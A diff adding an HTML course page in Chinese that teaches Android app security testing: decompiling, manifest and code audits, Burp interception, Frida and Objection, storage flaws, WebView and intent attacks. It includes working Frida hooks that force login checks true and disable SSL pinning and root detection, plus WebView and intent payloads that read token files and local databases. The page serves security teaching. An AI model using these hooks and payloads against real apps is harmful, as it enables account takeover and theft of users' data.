+  <div class="q-q">在進行 Android 安全測試時，你想從已安裝在設備上的目標 App 提取 APK 文件進行分析。以下正確的操作順序是？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>直接使用 <code>adb pull /data/app/com.target.app.apk</code></div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span>先用 <code>adb shell pm path com.target.app</code> 獲取 APK 路徑，再用 <code>adb pull</code> 提取</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span>使用 <code>adb install --extract</code> 命令</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>只能從 Google Play 下載，無法直接提取</div>
+  </div>
+  <div class="q-exp">正確！APK 的安裝路徑不是固定的，每個 App 的路徑都不同，格式通常是 /data/app/com.pkg-randomhash/base.apk。正確做法：先用 pm path 獲取確切路徑，再用 adb pull 提取到本機。另外也可以使用 apk-mitm、APKExtractor 等 App 在設備上直接導出。</div>
+</div>
+</div>
+
+
+<!-- ===== CH2: 靜態分析 ===== -->
+
+<!-- L2-1 反編譯 -->
+<div class="cb" id="l2-1">
+<h2>APK 反編譯：jadx / apktool</h2>
+<p>靜態分析是在不運行 App 的情況下分析其代碼和資源。反編譯工具將 .dex 字節碼還原成可讀的 Java/Kotlin 代碼，是代碼審計的基礎。</p>
+
+<div class="kg">
+  <div class="kt"><div class="kt-n">jadx</div><div class="kt-d">將 .dex 直接反編譯為 Java 源碼，有 GUI 介面（jadx-gui），支持搜索、交叉引用、資源查看。是最常用的 Android 反編譯工具，推薦使用 GUI 版本進行代碼審計。</div></div>
+  <div class="kt"><div class="kt-n">apktool</div><div class="kt-d">將 APK 反編譯為 Smali 組合語言（Android 的彙編語言）。主要用於修改 APK（如繞過 Root 檢測）後重新打包。jadx 的 Java 代碼更易讀，apktool 的 Smali 更適合精確修改。</div></div>
+  <div class="kt"><div class="kt-n">dex2jar + jd-gui</div><div class="kt-d">舊式工具組合：dex2jar 將 .dex 轉換為 .jar，再用 jd-gui 查看 Java 代碼。已基本被 jadx 取代，但某些混淆場景下的反編譯效果有所不同。</div></div>
+  <div class="kt"><div class="kt-n">Ghidra / IDA Pro</div><div class="kt-d">逆向工程框架，用於分析 APK 中的原生庫（.so 文件）。當敏感邏輯（如加密算法、Root 檢測）放在 C/C++ 原生代碼中時使用。</div></div>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">jadx / apktool — 基本使用</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── jadx 反編譯（推薦）───</span>
+<span class="cm"># 安裝</span>
+wget https://github.com/skylot/jadx/releases/latest/download/jadx-1.5.0.zip
+unzip jadx-1.5.0.zip -d jadx/
+
+<span class="cm"># 命令行反編譯到目錄</span>
+jadx/bin/jadx -d output_dir/ target.apk
+
+<span class="cm"># 啟動 GUI（推薦）</span>
+jadx/bin/jadx-gui target.apk
+
+<span class="cm"># ─── apktool 反編譯與重打包 ───</span>
+<span class="cm"># 反編譯（得到 Smali 代碼 + 資源）</span>
+apktool d target.apk -o target_smali/
+
+<span class="cm"># 修改 Smali 代碼後重新打包</span>
+apktool b target_smali/ -o modified.apk
+
+<span class="cm"># 重新簽名（重打包後必須簽名才能安裝）</span>
+keytool -genkey -v -keystore test.keystore -alias test -keyalg RSA -keysize 2048 -validity 10000
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore test.keystore modified.apk test
+<span class="cm"># 或使用 apksigner（更現代）</span>
+apksigner sign --ks test.keystore --ks-key-alias test modified.apk
+
+<span class="cm"># ─── 在 jadx 中高效搜索敏感信息 ───</span>
+<span class="cm"># jadx-gui 中使用 Ctrl+Shift+F 全局搜索：</span>
+<span class="cm"># 搜索關鍵詞：password  secret  apikey  token  hardcode  encrypt  BASE64</span>
+<span class="cm"># 搜索危險 API：Runtime.exec  loadUrl  setJavaScriptEnabled  openFileOutput</span></pre>
+</div>
+</div>
+
+<!-- L2-2 Manifest 審計 -->
+<div class="cb" id="l2-2">
+<h2>AndroidManifest.xml 安全審計</h2>
+<p>AndroidManifest.xml 是 Android App 的配置清單，包含組件聲明、權限請求等關鍵信息。靜態審計的第一步就是仔細分析 Manifest 文件。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">AndroidManifest.xml — 安全問題速查</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">&lt;!-- ─── 1. debuggable=true（高危！）─── --&gt;</span>
+<span class="cm">&lt;!-- 生產版本絕對不能開啟，允許 adb 直接 debug App，繞過沙盒 --&gt;</span>
+<span class="op">&lt;</span><span class="tg">application</span> <span class="at">android:debuggable</span>=<span class="vl">"true"</span><span class="op">&gt;</span>  <span class="cm">&lt;!-- 危！--&gt;</span>
+
+<span class="cm">&lt;!-- ─── 2. allowBackup=true（中危）─── --&gt;</span>
+<span class="cm">&lt;!-- 允許 adb backup 提取 App 所有數據（包括 SharedPreferences、DB）--&gt;</span>
+<span class="op">&lt;</span><span class="tg">application</span> <span class="at">android:allowBackup</span>=<span class="vl">"true"</span><span class="op">&gt;</span>  <span class="cm">&lt;!-- 敏感 App 應設為 false --&gt;</span>
+
+<span class="cm">&lt;!-- ─── 3. 組件過度暴露 ─── --&gt;</span>
+<span class="cm">&lt;!-- Activity 暴露且無 permission 保護：任意 App 可啟動 --&gt;</span>
+<span class="op">&lt;</span><span class="tg">activity</span> <span class="at">android:name</span>=<span class="vl">".AdminActivity"</span> <span class="at">android:exported</span>=<span class="vl">"true"</span><span class="op">&gt;</span>
+
+<span class="cm">&lt;!-- ContentProvider 讀寫均未設權限 --&gt;</span>
+<span class="op">&lt;</span><span class="tg">provider</span>
+    <span class="at">android:name</span>=<span class="vl">".UserProvider"</span>
+    <span class="at">android:exported</span>=<span class="vl">"true"</span>
+    <span class="at">android:readPermission</span>=<span class="vl">""</span>   <span class="cm">&lt;!-- 空字串 = 任意可讀！--&gt;</span>
+    <span class="at">android:writePermission</span>=<span class="vl">""</span><span class="op">&gt;</span>
+
+<span class="cm">&lt;!-- ─── 4. 過度請求危險權限 ─── --&gt;</span>
+<span class="op">&lt;</span><span class="tg">uses-permission</span> <span class="at">android:name</span>=<span class="vl">"android.permission.READ_CONTACTS"</span><span class="op">/&gt;</span>
+<span class="op">&lt;</span><span class="tg">uses-permission</span> <span class="at">android:name</span>=<span class="vl">"android.permission.RECORD_AUDIO"</span><span class="op">/&gt;</span>
+<span class="op">&lt;</span><span class="tg">uses-permission</span> <span class="at">android:name</span>=<span class="vl">"android.permission.ACCESS_FINE_LOCATION"</span><span class="op">/&gt;</span>
+<span class="cm">&lt;!-- 一個筆記 App 為何需要麥克風和精確位置？疑似間諜軟件 --&gt;</span>
+
+<span class="cm">&lt;!-- ─── 5. 深度連結（Deep Link）配置 ─── --&gt;</span>
+<span class="op">&lt;</span><span class="tg">intent-filter</span><span class="op">&gt;</span>
+    <span class="op">&lt;</span><span class="tg">action</span> <span class="at">android:name</span>=<span class="vl">"android.intent.action.VIEW"</span><span class="op">/&gt;</span>
+    <span class="op">&lt;</span><span class="tg">data</span> <span class="at">android:scheme</span>=<span class="vl">"myapp"</span> <span class="at">android:host</span>=<span class="vl">"callback"</span><span class="op">/&gt;</span>
+<span class="op">&lt;/</span><span class="tg">intent-filter</span><span class="op">&gt;</span>
+<span class="cm">&lt;!-- 自定義 scheme 可被其他 App 偽造：myapp://callback?token=stolen --&gt;</span></pre>
+</div>
+</div>
+
+<!-- L2-3 代碼審計 -->
+<div class="cb" id="l2-3">
+<h2>代碼審計：敏感信息與危險 API</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Android 代碼審計 — 關鍵搜索目標</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">// ─── 1. 硬編碼敏感信息（常見！）───</span>
+<span class="cm">// 在 jadx-gui 中搜索：</span>
+String apiKey = <span class="st">"sk-live-xxxxxxxxxxxxxxxx"</span>;      <span class="cm">// API Key</span>
+String dbPass = <span class="st">"admin123"</span>;                      <span class="cm">// 資料庫密碼</span>
+String aesKey = <span class="st">"MySecretKey123456"</span>;              <span class="cm">// 加密密鑰</span>
+String url    = <span class="st">"http://192.168.1.100:8080/api"</span>;  <span class="cm">// 內網地址洩露</span>
+
+<span class="cm">// ─── 2. 不安全的日誌輸出 ───</span>
+Log.d(<span class="st">"Auth"</span>, <span class="st">"Token: "</span> + authToken);      <span class="cm">// adb logcat 可見</span>
+Log.e(<span class="st">"DB"</span>, <span class="st">"Error: "</span> + query + password); <span class="cm">// 密碼出現在日誌中</span>
+
+<span class="cm">// ─── 3. 不安全的 WebView 配置 ───</span>
+webView.getSettings().setJavaScriptEnabled(<span class="kw">true</span>);
+webView.getSettings().setAllowFileAccess(<span class="kw">true</span>);        <span class="cm">// 允許讀取本地文件</span>
+webView.getSettings().setAllowFileAccessFromFileURLs(<span class="kw">true</span>); <span class="cm">// 危！</span>
+webView.addJavascriptInterface(<span class="kw">new</span> <span class="fn">JsInterface</span>(), <span class="st">"android"</span>); <span class="cm">// JS 橋接</span>
+
+<span class="cm">// ─── 4. 明文 HTTP 通訊 ───</span>
+URL url = <span class="kw">new</span> <span class="fn">URL</span>(<span class="st">"http://api.target.com/login"</span>); <span class="cm">// 無加密傳輸</span>
+
+<span class="cm">// ─── 5. 不安全的隨機數（密碼學相關）───</span>
+Random r = <span class="kw">new</span> <span class="fn">Random</span>();   <span class="cm">// 應使用 SecureRandom</span>
+r.nextInt(<span class="nu">1000000</span>);         <span class="cm">// 可預測的 OTP！</span>
+
+<span class="cm">// ─── 6. 命令執行（少見但高危）───</span>
+Runtime.getRuntime().exec(cmd);  <span class="cm">// 如果 cmd 包含用戶輸入 → 命令注入</span>
+
+<span class="cm">// ─── 7. 弱加密 ───</span>
+Cipher.getInstance(<span class="st">"DES"</span>);          <span class="cm">// DES 已不安全，應用 AES-256</span>
+Cipher.getInstance(<span class="st">"AES/ECB/..."</span>);  <span class="cm">// ECB 模式不安全（相同明文→相同密文）</span>
+MessageDigest.getInstance(<span class="st">"MD5"</span>);    <span class="cm">// 不應用於密碼 Hash，應用 bcrypt/scrypt</span></pre>
+</div>
+</div>
+
+<!-- L2-4 資源提取 -->
+<div class="cb" id="l2-4">
+<h2>資源與資產提取分析</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">APK 資源提取與分析</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 解壓 APK（APK = ZIP）───</span>
+unzip target.apk -d apk_extracted/
+ls apk_extracted/
+
+<span class="cm"># ─── 提取字串資源（可能含硬編碼 URL、Key）───</span>
+<span class="cm"># 使用 apktool 反編譯後：</span>
+cat target_smali/res/values/strings.xml | grep -i "key\|secret\|api\|url\|password"
+
+<span class="cm"># ─── 搜索 assets/ 目錄 ───</span>
+find apk_extracted/assets/ -type f
+<span class="cm"># 常見發現：config.json（含 API 端點）、本地 SQLite DB、加密用的密鑰文件</span>
+file apk_extracted/assets/*   <span class="cm"># 識別文件類型</span>
+
+<span class="cm"># ─── 搜索 .so 原生庫中的字串 ───</span>
+strings apk_extracted/lib/arm64-v8a/libnative.so | grep -i "key\|secret\|http"
+
+<span class="cm"># ─── 分析嵌入式 SQLite 資料庫 ───</span>
+file apk_extracted/assets/*.db
+sqlite3 apk_extracted/assets/local.db
+sqlite> .tables
+sqlite> SELECT * FROM users;
+
+<span class="cm"># ─── 自動化工具：MobSF 靜態分析 ───</span>
+docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf
+<span class="cm"># 訪問 http://localhost:8000 → 上傳 APK → 自動分析報告</span></pre>
+</div>
+
+<div class="note warn">
+  <div class="note-lbl">代碼混淆（Obfuscation）</div>
+  <p>大多數商業 App 會使用 ProGuard 或 R8 進行代碼混淆，將類名/方法名替換為 <code>a.b.c()</code> 等無意義名稱，增加逆向難度。應對策略：尋找關鍵字串（如 "password"）作為線索，使用 jadx 的交叉引用功能追蹤調用鏈，不需要看懂所有代碼，只需找到感興趣的功能點。</p>
+</div>
+</div>
+
+
+<!-- ===== CH3: 動態分析 ===== -->
+
+<!-- L3-1 HTTPS 抓包 -->
+<div class="cb" id="l3-1">
+<h2>HTTP(S) 流量抓包：Burp + 憑證繞過</h2>
+<p>抓取 App 的 HTTP(S) 流量是動態分析的核心，能直接看到 App 與服務器之間的通訊，發現未加密的敏感數據、不安全的 API 設計等問題。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Android HTTPS 抓包配置</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 方法1：設置 WiFi 代理（基本方法）───</span>
+<span class="cm"># 設備 → WiFi → 長按當前網路 → 修改 → 進階 → 代理 → 手動</span>
+<span class="cm"># 主機名：攻擊機 IP（如 192.168.1.50）</span>
+<span class="cm"># 端口：8080（Burp 默認監聽端口）</span>
+
+<span class="cm"># ─── Android 7.0+ 的 TrustManager 問題 ───</span>
+<span class="cm"># Android 7.0 起，App 默認不信任用戶安裝的 CA（只信任系統 CA）</span>
+<span class="cm"># 解決方案1（最簡單）：將 Burp CA 推送到系統信任存儲（需 Root）</span>
+<span class="cm"># 見 L1-3 中的步驟</span>
+
+<span class="cm"># 解決方案2：修改 APK 的 network_security_config</span>
+<span class="cm"># 在 res/xml/network_security_config.xml 中添加用戶憑證信任：</span>
+<span class="cm"># &lt;network-security-config&gt;</span>
+<span class="cm">#   &lt;debug-overrides&gt;</span>
+<span class="cm">#     &lt;trust-anchors&gt;</span>
+<span class="cm">#       &lt;certificates src="user"/&gt;  &lt;!-- 信任用戶安裝的 CA --&gt;</span>
+<span class="cm">#     &lt;/trust-anchors&gt;</span>
+<span class="cm">#   &lt;/debug-overrides&gt;</span>
+<span class="cm"># &lt;/network-security-config&gt;</span>
+<span class="cm"># 然後用 apktool 重打包並安裝</span>
+
+<span class="cm"># 解決方案3：使用 apk-mitm 工具自動完成上述修改</span>
+npm install -g apk-mitm
+apk-mitm target.apk      <span class="cm"># 自動修改並重打包</span>
+
+<span class="cm"># ─── 憑證固定（Certificate Pinning）繞過 ───</span>
+<span class="cm"># 部分 App 內建了服務器的憑證 Hash（Pin），即使安裝了 Burp CA 也無法抓包</span>
+<span class="cm"># 繞過方法：使用 Frida Hook 掛起 SSL 驗證（見 L3-2）</span>
+<span class="cm"># 工具：objection --  android sslpinning disable</span>
+<span class="cm">#        Frida SSL unpinning 通用腳本</span></pre>
+</div>
+</div>
+
+<!-- L3-2 Frida 入門 -->
+<div class="cb" id="l3-2">
+<h2>Frida 動態插樁入門</h2>
+<p>Frida 是業界最強大的動態插樁框架，允許在 App 運行時注入 JavaScript 代碼，Hook 任意 Java 方法，修改參數和返回值，繞過各種安全機制。</p>
+
+<h3>Frida 架構</h3>
+<p>Frida 由兩部分組成：在電腦端運行的 <strong>frida-tools（Python 工具集）</strong>，和在 Android 設備上運行的 <strong>frida-server（守護進程）</strong>。電腦端通過 ADB 與設備端通訊，注入 JavaScript 代碼到目標 App 進程。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Frida — 安裝與基本使用</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 安裝 frida-tools（電腦端）───</span>
+pip3 install frida-tools
+
+<span class="cm"># ─── 在 Android 設備上部署 frida-server ───</span>
+<span class="cm"># 步驟1：確認設備架構</span>
+adb shell getprop ro.product.cpu.abi    <span class="cm"># 輸出：arm64-v8a</span>
+
+<span class="cm"># 步驟2：下載對應版本的 frida-server</span>
+<span class="cm"># https://github.com/frida/frida/releases</span>
+<span class="cm"># 下載 frida-server-16.x.x-android-arm64.xz</span>
+xz -d frida-server-16.x.x-android-arm64.xz
+
+<span class="cm"># 步驟3：推送並啟動</span>
+adb push frida-server-16.x.x-android-arm64 /data/local/tmp/frida-server
+adb shell chmod 755 /data/local/tmp/frida-server
+adb shell su -c "/data/local/tmp/frida-server &"   <span class="cm"># 後台啟動</span>
+
+<span class="cm"># ─── 基本操作 ───</span>
+frida-ps -U                               <span class="cm"># 列出設備上所有進程</span>
+frida-ps -U -a                            <span class="cm"># 只列出 App（包名）</span>
+frida -U -f com.target.app -l hook.js    <span class="cm"># 啟動 App 並注入腳本（spawn 模式）</span>
+frida -U com.target.app -l hook.js       <span class="cm"># 附加到運行中的 App（attach 模式）</span></pre>
+</div>
+</div>
+
+<!-- L3-3 Frida Hook 實戰 -->
+<div class="cb" id="l3-3">
+<h2>Frida Hook 實戰：繞過登入與 SSL Pinning</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Frida JavaScript Hook 腳本範例</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">// ─── 範例1：Hook Java 方法，打印參數和返回值 ───</span>
+Java.perform(<span class="kw">function</span>() {
+    <span class="kw">var</span> LoginActivity = Java.use(<span class="st">'com.target.app.LoginActivity'</span>);
+
+    LoginActivity.checkLogin.implementation = <span class="kw">function</span>(username, password) {
+        console.log(<span class="st">'[+] checkLogin called'</span>);
+        console.log(<span class="st">'    username: '</span> + username);
+        console.log(<span class="st">'    password: '</span> + password);
+
+        <span class="cm">// 調用原始方法</span>
+        <span class="kw">var</span> result = <span class="kw">this</span>.checkLogin(username, password);
+        console.log(<span class="st">'    return: '</span> + result);
+        <span class="kw">return</span> result;
+    };
+});
+
+<span class="cm">// ─── 範例2：強制讓登入驗證返回 true ───</span>
+Java.perform(<span class="kw">function</span>() {
+    <span class="kw">var</span> AuthManager = Java.use(<span class="st">'com.target.app.AuthManager'</span>);
+    AuthManager.isAuthenticated.implementation = <span class="kw">function</span>() {
+        console.log(<span class="st">'[+] isAuthenticated hooked → returning true'</span>);
+        <span class="kw">return</span> <span class="kw">true</span>;  <span class="cm">// 強制返回已登入</span>
+    };
+});
+
+<span class="cm">// ─── 範例3：繞過 Root 檢測 ───</span>
+Java.perform(<span class="kw">function</span>() {
+    <span class="cm">// Hook RootBeer 函數庫（常用 Root 檢測庫）</span>
+    <span class="kw">var</span> RootBeer = Java.use(<span class="st">'com.scottyab.rootbeer.RootBeer'</span>);
+    RootBeer.isRooted.implementation = <span class="kw">function</span>() {
+        console.log(<span class="st">'[+] isRooted → returning false'</span>);
+        <span class="kw">return</span> <span class="kw">false</span>;
+    };
+});
+
+<span class="cm">// ─── 範例4：通用 SSL Pinning 繞過 ───</span>
+Java.perform(<span class="kw">function</span>() {
+    <span class="cm">// 讓所有 TrustManager 信任任何憑證</span>
+    <span class="kw">var</span> X509TrustManager = Java.use(<span class="st">'javax.net.ssl.X509TrustManager'</span>);
+    <span class="kw">var</span> SSLContext = Java.use(<span class="st">'javax.net.ssl.SSLContext'</span>);
+
+    <span class="kw">var</span> TrustAllCerts = Java.registerClass({
+        name: <span class="st">'com.bypass.TrustAllCerts'</span>,
+        implements: [X509TrustManager],
+        methods: {
+            checkClientTrusted: <span class="kw">function</span>() {},
+            checkServerTrusted: <span class="kw">function</span>() {},
+            getAcceptedIssuers: <span class="kw">function</span>() { <span class="kw">return</span> []; }
+        }
+    });
+
+    <span class="kw">var</span> sslContext = SSLContext.getInstance(<span class="st">"TLS"</span>);
+    sslContext.init(<span class="kw">null</span>, [TrustAllCerts.$new()], <span class="kw">null</span>);
+    SSLContext.getDefault.implementation = <span class="kw">function</span>() {
+        <span class="kw">return</span> sslContext;
+    };
+    console.log(<span class="st">'[+] SSL Pinning bypassed'</span>);
+});</pre>
+</div>
+
+<div class="note tip">
+  <div class="note-lbl">通用 SSL Pinning 繞過腳本</div>
+  <p>實際測試中不需要自己寫 SSL 繞過腳本，GitHub 上有多個維護良好的通用腳本：<br>
+  <strong>frida-multiple-bypass</strong>（JellyJobs）— 涵蓋 OkHttp、Cronet、Conscrypt、Xamarin 等多個網絡庫<br>
+  <strong>ssl-kill-switch3</strong>（的 Android 版本）— 通用 SSL Pinning 繞過<br>
+  使用方式：<code>frida -U -f com.target.app -l ssl-bypass.js --no-pause</code></p>
+</div>
+</div>
+
+<!-- L3-4 Objection -->
+<div class="cb" id="l3-4">
+<h2>Objection 自動化測試框架</h2>
+<p>Objection 是基於 Frida 的移動安全測試框架，將常見的 Hook 操作封裝成命令，不需要寫 JavaScript 代碼即可完成 SSL Pinning 繞過、Root 檢測繞過、數據庫查看等操作。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Objection — 核心命令速查</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 安裝和啟動 ───</span>
+pip3 install objection
+
+<span class="cm"># 啟動（需要 frida-server 在設備上運行）</span>
+objection -g com.target.app explore
+
+<span class="cm"># ─── Objection 交互式 Shell 常用命令 ───</span>
+
+<span class="cm"># SSL Pinning 繞過（最常用！）</span>
+android sslpinning disable
+
+<span class="cm"># Root 檢測繞過</span>
+android root disable
+
+<span class="cm"># 列出 App 所有存儲的文件</span>
+env                          <span class="cm"># 查看 App 數據目錄路徑</span>
+ls                           <span class="cm"># 列出當前目錄（默認為 App 數據目錄）</span>
+
+<span class="cm"># 查看 SharedPreferences（XML 格式）</span>
+android shared_preferences print
+
+<span class="cm"># 查看應用內 SQLite 資料庫</span>
+sqlite connect /data/data/com.target.app/databases/user.db
+sqlite execute select * from users
+
+<span class="cm"># 列出和Hook類方法</span>
+android hooking list classes                             <span class="cm"># 列出所有載入的類</span>
+android hooking search classes LoginActivity            <span class="cm"># 搜索類</span>
+android hooking list class_methods com.target.LoginActivity  <span class="cm"># 列出方法</span>
+android hooking watch class_method com.target.LoginActivity.checkLogin  <span class="cm"># 監聽方法調用</span>
+
+<span class="cm"># 截圖和記憶體操作</span>
+android ui screenshot /tmp/screen.png</pre>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">在測試一個銀行 App 時，你配置了 Burp Suite 代理，但 HTTPS 流量無法被攔截，顯示 SSL 握手失敗。排除了 Burp CA 未安裝的可能後，最可能的原因是什麼？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>Burp Suite 不支持攔截 Android App 的流量</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">B</span>App 使用的是 HTTP/3（QUIC），不走 TCP 代理</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">C</span>App 實施了憑證固定（Certificate Pinning），內建了服務器憑證 Hash，拒絕信任 Burp CA</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>設備 WiFi 代理設置錯誤</div>
+  </div>
+  <div class="q-exp">正確！憑證固定（Certificate Pinning）是銀行、金融類 App 的標配安全措施。App 在代碼中預先存儲了目標服務器的憑證 Hash 或公鑰，在建立 TLS 連接時不僅驗證憑證是否合法，還驗證是否與預存的 Hash 匹配。即使安裝了 Burp CA，由於 Hash 不匹配，SSL 握手仍然失敗。解決方案：使用 Frida Hook 或 Objection 的 android sslpinning disable 繞過。</div>
+</div>
+</div>
+
+<!-- ===== CH4: 漏洞攻防 ===== -->
+
+<!-- L4-1 不安全數據存儲 -->
+<div class="cb" id="l4-1">
+<h2>不安全的數據存儲</h2>
+<p>Android App 有多種數據存儲方式，每種方式的安全性不同。許多 App 將敏感數據（Session Token、密碼、個人信息）存儲在不安全的位置，是 OWASP Mobile Top 10 的第一位。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>存儲方式</th><th>位置</th><th>默認安全性</th><th>常見問題</th></tr></thead>
+    <tbody>
+      <tr><td><strong>SharedPreferences</strong></td><td>/data/data/pkg/shared_prefs/*.xml</td><td>沙盒保護（Root 後可讀）</td><td>明文存儲 Token/密碼；MODE_WORLD_READABLE 允許任意 App 讀取</td></tr>
+      <tr><td><strong>SQLite 資料庫</strong></td><td>/data/data/pkg/databases/*.db</td><td>沙盒保護（Root 後可讀）</td><td>未加密存儲敏感數據；SQL 注入（通過 ContentProvider）</td></tr>
+      <tr><td><strong>外部存儲（SD 卡）</strong></td><td>/sdcard/Android/data/pkg/</td><td>無保護，任意 App 可讀</td><td>將敏感文件（備份、日誌）寫入外部存儲</td></tr>
+      <tr><td><strong>緩存文件</strong></td><td>/data/data/pkg/cache/</td><td>沙盒保護</td><td>HTTP 響應緩存包含敏感 API 數據</td></tr>
+      <tr><td><strong>KeyStore</strong></td><td>硬體安全存儲</td><td>最安全</td><td>很少出現問題；正確做法是用 KeyStore 存儲密鑰</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">不安全數據存儲 — 測試與發現</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 使用 adb 提取和分析數據（需 Root 或 debuggable App）───</span>
+adb shell su -c "ls /data/data/com.target.app/"
+adb shell su -c "cat /data/data/com.target.app/shared_prefs/user_prefs.xml"
+adb pull /data/data/com.target.app/ ./app_data/
+
+<span class="cm"># ─── 使用 objection 分析（更方便）───</span>
+objection -g com.target.app explore
+<span class="cm"># 在 objection shell 中：</span>
+env                                          <span class="cm"># 查看所有數據目錄</span>
+android shared_preferences print            <span class="cm"># 印出所有 SharedPrefs</span>
+sqlite connect /data/data/.../user.db
+sqlite execute select * from sessions        <span class="cm"># 查找 Session Token</span>
+
+<span class="cm"># ─── 使用 adb backup（不需要 Root）───</span>
+<span class="cm"># 如果 allowBackup=true（AndroidManifest），可提取 App 數據</span>
+adb backup -noapk com.target.app
+<span class="cm"># 轉換備份文件格式</span>
+dd if=backup.ab bs=24 skip=1 | python3 -c "import zlib,sys;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > backup.tar
+tar -xvf backup.tar</pre>
+</div>
+</div>
+
+<!-- L4-2 WebView 漏洞 -->
+<div class="cb" id="l4-2">
+<h2>WebView 漏洞：XSS 與 UXSS</h2>
+<p>WebView 是 Android App 內嵌的 Web 瀏覽器組件，允許 App 顯示 Web 內容。不安全的 WebView 配置可能讓 Web 漏洞影響整個 App，甚至讀取本地文件。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">WebView 漏洞利用</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">// ─── 危險配置（代碼中）───</span>
+WebSettings settings = webView.getSettings();
+settings.setJavaScriptEnabled(<span class="kw">true</span>);
+settings.setAllowFileAccess(<span class="kw">true</span>);                  <span class="cm">// 允許 file:// URI</span>
+settings.setAllowFileAccessFromFileURLs(<span class="kw">true</span>);       <span class="cm">// 允許跨 file:// 訪問</span>
+settings.setAllowUniversalAccessFromFileURLs(<span class="kw">true</span>); <span class="cm">// 危！file:// 可跨域請求</span>
+
+<span class="cm">// ─── 攻擊1：讀取本地文件（AllowUniversalAccess）───</span>
+<span class="cm">// 攻擊者誘使目標 App 的 WebView 載入惡意頁面：</span>
+<span class="cm">// 惡意頁面 JS：</span>
+<span class="kw">var</span> xhr = <span class="kw">new</span> XMLHttpRequest();
+xhr.open(<span class="st">"GET"</span>, <span class="st">"file:///data/data/com.target.app/shared_prefs/tokens.xml"</span>, <span class="kw">false</span>);
+xhr.send(<span class="kw">null</span>);
+<span class="cm">// 然後把 xhr.responseText 發送到攻擊者服務器</span>
+
+<span class="cm">// ─── 攻擊2：JavaScript Bridge 注入（addJavascriptInterface）───</span>
+<span class="cm">// 如果 App 設置了 JS Bridge：</span>
+webView.addJavascriptInterface(<span class="kw">new</span> <span class="fn">AppBridge</span>(), <span class="st">"Android"</span>);
+
+<span class="cm">// 惡意頁面可調用 Android 原生方法：</span>
+Android.readFile(<span class="st">"/etc/hosts"</span>);           <span class="cm">// 如果 Bridge 暴露了文件操作</span>
+Android.executeCommand(<span class="st">"id"</span>);            <span class="cm">// 如果 Bridge 暴露了命令執行</span>
+<span class="cm">// Android 4.2 以前：Bridge 暴露所有 public 方法（含 getClass()），可 RCE</span>
+
+<span class="cm">// ─── 攻擊3：深度連結觸發 WebView XSS ───</span>
+<span class="cm">// 發現 App 有深度連結處理 URL 的 Activity</span>
+<span class="cm">// 構造惡意連結：</span>
+adb shell am start -a android.intent.action.VIEW \
+  -d "myapp://webview?url=javascript:alert(document.cookie)"</pre>
+</div>
+</div>
+
+<!-- L4-3 Intent 劫持 -->
+<div class="cb" id="l4-3">
+<h2>Intent 劫持與深度連結濫用</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Intent 劫持與測試方法</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 測試暴露的 Activity（Intent 劫持）───</span>
+<span class="cm"># 用 adb 直接啟動暴露的 Activity，繞過正常流程</span>
+adb shell am start -n com.target.app/.AdminActivity
+adb shell am start -n com.target.app/.SettingsActivity
+
+<span class="cm"># 帶數據啟動（測試 Intent Extras 注入）</span>
+adb shell am start -n com.target.app/.WebViewActivity \
+  --es url "javascript:alert(1)"                    <span class="cm"># XSS via Intent</span>
+
+adb shell am start -n com.target.app/.WebViewActivity \
+  --es url "file:///data/data/com.target.app/databases/user.db"  <span class="cm"># 讀取本地文件</span>
+
+<span class="cm"># ─── 測試深度連結（Deep Link）───</span>
+<span class="cm"># 從 Manifest 找到 scheme，用 adb 發送：</span>
+adb shell am start -a android.intent.action.VIEW \
+  -d "myapp://reset_password?token=test123"         <span class="cm"># 測試密碼重置流程</span>
+
+adb shell am start -a android.intent.action.VIEW \
+  -d "myapp://oauth/callback?code=stolen_code"      <span class="cm"># OAuth Token 劫持</span>
+
+<span class="cm"># ─── 測試暴露的 ContentProvider ───</span>
+<span class="cm"># 從 Manifest 找到 authority，用 adb 查詢：</span>
+adb shell content query --uri content://com.target.app.provider/users
+adb shell content query --uri content://com.target.app.provider/users \
